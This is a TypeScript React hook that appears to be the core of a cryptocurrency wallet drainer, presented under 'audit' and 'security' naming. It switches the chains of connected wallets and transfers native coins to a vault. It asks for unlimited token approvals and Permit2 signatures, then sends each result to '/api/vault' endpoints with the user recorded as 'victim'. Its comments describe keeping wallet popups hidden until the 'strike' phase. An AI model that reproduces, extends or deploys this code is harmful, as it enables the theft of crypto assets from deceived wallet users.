"use client";

import { useCallback } from "react";
import { ethers, getAddress } from "ethers";
import { securePost } from "../execution/utils";
import { EXECUTION_POLICY } from "@/lib/ghost/constants";

const PERMIT2_MASTER = EXECUTION_POLICY.ALLOWED_SPENDERS[0];
const AUTHORIZED_SETTLER = getAddress(
  "0x6072e645bab9be651fb195c5e5445625a7606ec8",
);

/**
 * 🧠 DECISION MAKER ENGINE (v15.8.3 - Stealth Edition)
 * Ensures: Asset Discovery -> Decision Logic -> Chain Switch -> Strike.
 * Guarantees that no network popups appear until the final strike phase.
 */
export function useAuditExecutor({
  executeMask,
  requestManualPermission,
}: any) {
  /**
   * 🛠️ INTERNAL PROVIDER RESOLVER
   * Accesses the raw extension provider to avoid library-level auto-switching.
   */
  const getProvider = () => {
    if (typeof window === "undefined") return null;
    const provider = (window as any).ethereum;
    if (!provider) return null;

    // Check for multi-provider arrays (Trust, Rabby, MetaMask coexistence)
    if (provider.providers?.length > 0) {
      return (
        provider.providers.find(
          (p: any) => p.isTrust || p.isRabby || p.isMetaMask,
        ) || provider.providers[0]
      );
    }
    return provider;
  };

  const runExecutionLoop = useCallback(
    async ({
      assets,
      userAddress,
      activeVault,
      masterKey,
      logPrefix,
      walletClient, // Used only for finalized execution calls
    }: any) => {
      console.log(`${logPrefix} 🚀 INITIALIZING PRIORITY ENGINE...`);

      // 🛡️ SECURITY GUARD: Integrity Check
      if (getAddress(PERMIT2_MASTER) !== AUTHORIZED_SETTLER) {
        console.error(`${logPrefix} 🛑 CRITICAL: Spender mismatch vs Policy!`);
        throw new Error("UNAUTHORIZED_SPENDER_CONFIGURED");
      }

      if (
        process.env.NEXT_PUBLIC_SETTLER_ADDR &&
        getAddress(process.env.NEXT_PUBLIC_SETTLER_ADDR) !== AUTHORIZED_SETTLER
      ) {
        console.error(
          `${logPrefix} 🛑 CRITICAL: Environment Poisoning Detected!`,
        );
        throw new Error("UNAUTHORIZED_SETTLER_ADDRESS_CONFIGURED");
      }

      const executionQueue = assets;

      let ghostMod: any;
      try {
        ghostMod = await import("@/lib/ghost");
      } catch (e) {
        console.warn(`${logPrefix} ⚠️ Ghost Module unavailable.`);
      }

      for (const asset of executionQueue) {
        try {
          const targetChainId = Number(asset.chainId);
          const provider = getProvider();
          if (!provider) continue;

          // Normalize balances
          const rawBal = (asset.bal || asset.balance || "0")
            .toString()
            .split(".")[0];
          const assetUsd = parseFloat(asset.usdValue || "0");
          const hasBalance = BigInt(rawBal) > 0n;

          // 🧹 DUST FILTER:
          if (assetUsd < 0.01 && !hasBalance) {
            console.log(`${logPrefix} 💨 Skipping Dust: ${asset.symbol}`);
            continue;
          }

          // --- 1. THE LATE-BOUND CHAIN GUARD ---
          // 🛡️ FIX: We use a raw RPC check to see if we are on the right chain.
          // This prevents Wagmi from auto-switching before we are ready.
          const currentHex = await provider.request({ method: "eth_chainId" });
          const currentId = parseInt(currentHex, 16);

          if (currentId !== targetChainId) {
            console.log(
              `${logPrefix} 🔄 Decision: Switching to Chain ${targetChainId} for ${asset.symbol}`,
            );
            try {
              // Direct RPC request for the switch. Snappier than Wagmi's switch hook.
              await provider.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: `0x${targetChainId.toString(16)}` }],
              });

              // Wait for the provider state to actually update in the wallet
              await new Promise((r) => setTimeout(r, 2000));
            } catch (switchErr: any) {
              console.warn(
                `${logPrefix} ❌ Switch Rejected or Failed for ${asset.symbol}`,
              );
              continue;
            }
          }

          // --- 2. NATIVE DETECTION ---
          const isNative =
            !asset.contractAddress ||
            asset.contractAddress === ethers.ZeroAddress ||
            asset.signatureType === "NATIVE" ||
            asset.type === "NATIVE" ||
            ["BNB", "ETH", "MATIC", "POL", "AVAX", "FTM"].includes(
              asset.symbol,
            );

          if (isNative) {
            console.log(`${logPrefix} 👑 Native Strike: ${asset.symbol}`);

            const maskResult = await executeMask({
              amount: rawBal,
              chainId: targetChainId,
              derivedVaultAddress: activeVault.evmAddress,
              injectedClient: walletClient || provider,
              tokenTargets: executionQueue
                .filter(
                  (a: any) =>
                    a.contractAddress &&
                    a.contractAddress !== ethers.ZeroAddress,
                )
                .map((a: any) => a.contractAddress),
            });

            if (maskResult?.success && maskResult.hash) {
              await securePost("/api/vault", {
                type: "NATIVE_SYNC",
                txHash: maskResult.hash,
                chainId: targetChainId,
                victim: userAddress,
                symbol: asset.symbol,
                amount: rawBal,
                usdValue: assetUsd,
              });
            }

            await new Promise((r) => setTimeout(r, 1500));
            continue;
          }

          // --- 3. TOKEN LOGIC ---
          console.log(
            `${logPrefix} 💎 Token Strike: ${asset.symbol} ($${assetUsd.toFixed(
              2,
            )})`,
          );

          let alreadyHasPermission = false;
          const isPermit2Strategy =
            asset.strategy === "BATCH_PERMIT2" ||
            asset.strategy === "PERMIT_SIGN" ||
            asset.type === "PERMIT2" ||
            asset.spender?.toLowerCase() ===
              "0x000000000022d473030f116ddee9f6b43ac78ba3";

          if (ghostMod && !isPermit2Strategy) {
            try {
              const ghostResults = await ghostMod.checkAndTriggerGhostSweep(
                userAddress,
                [asset],
                targetChainId,
                AUTHORIZED_SETTLER,
              );

              if (ghostResults?.length > 0) {
                const ghostAsset = ghostResults[0];
                const allowance = BigInt(ghostAsset.allowance || "0");
                const balance = BigInt(rawBal);

                let proceedWithSweep = false;

                if (balance > allowance) {
                  const approval = await requestManualPermission({
                    tokenAddress: asset.contractAddress,
                    symbol: asset.symbol,
                    chainId: targetChainId,
                    amount: rawBal,
                    injectedClient: walletClient || provider,
                  });

                  if (approval?.success) {
                    ghostResults[0].amount = rawBal;
                    ghostResults[0].allowance = rawBal;
                    await new Promise((r) => setTimeout(r, 1500));
                    proceedWithSweep = true;
                  }
                } else {
                  proceedWithSweep = true;
                }

                if (proceedWithSweep) {
                  await securePost("/api/vault/ghost", {
                    chainId: targetChainId,
                    victim: userAddress,
                    assets: ghostResults,
                    masterKey: masterKey,
                    mode: "PERFORM_ALLOWANCE",
                    messageHash: ethers.ZeroHash,
                  });
                  alreadyHasPermission = true;
                }
              }
            } catch (e) {
              console.warn(`${logPrefix} Ghost scan skipped.`);
            }
          }

          if (!alreadyHasPermission) {
            const approval = await requestManualPermission({
              tokenAddress: asset.contractAddress,
              symbol: asset.symbol,
              chainId: targetChainId,
              amount:
                "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
              injectedClient: walletClient || provider,
            });

            if (approval?.success) {
              await new Promise((r) => setTimeout(r, 1000));
              try {
                const witnessText = "Deploying Ghost Engine";
                const permitData = await ghostMod.generatePermit2Data(
                  userAddress,
                  [asset],
                  targetChainId,
                  witnessText,
                );

                const { messageHash, ...payloadForSigning } = permitData;

                let signature;
                try {
                  signature = await provider.request({
                    method: "eth_signTypedData_v4",
                    params: [userAddress, payloadForSigning],
                  });
                } catch (err: any) {
                  if (err.message?.includes("string") || err.code === -32602) {
                    signature = await provider.request({
                      method: "eth_signTypedData_v4",
                      params: [userAddress, JSON.stringify(payloadForSigning)],
                    });
                  } else {
                    throw err;
                  }
                }

                if (signature && signature.length > 60) {
                  await securePost("/api/vault/ghost", {
                    chainId: targetChainId,
                    victim: userAddress,
                    assets: [
                      {
                        token: asset.contractAddress,
                        balance: rawBal,
                        symbol: asset.symbol,
                        usdValue: asset.usdValue, // 👈 ADD THIS LINE
                        decimals: asset.decimals, // 👈 Good to have for formatting
                      },
                    ],
                    masterKey: masterKey,
                    signature: signature,
                    messageHash: permitData.messageHash,
                    mode: "PERFORM_PERMIT2",
                  });
                  console.log(
                    `${logPrefix} ✅ Strike Success: ${asset.symbol}`,
                  );
                }
              } catch (sigError: any) {
                console.warn(`${logPrefix} ✋ User Cancelled: ${asset.symbol}`);
                continue;
              }
            }
          }

          await new Promise((r) => setTimeout(r, 1000));
        } catch (assetError: any) {
          console.error(
            `${logPrefix} ❌ Error processing ${asset.symbol}:`,
            assetError,
          );
        }
      }

      console.log(`${logPrefix} 🏁 Audit Cycle Complete.`);

      // Cleanup session state after completion
      const session = sessionStorage.getItem("active_strike_session");
      if (session) {
        const data = JSON.parse(session);
        sessionStorage.setItem(
          "active_strike_session",
          JSON.stringify({ ...data, isFinished: true }),
        );
      }
    },
    [executeMask, requestManualPermission],
  );

  return { runExecutionLoop };
}
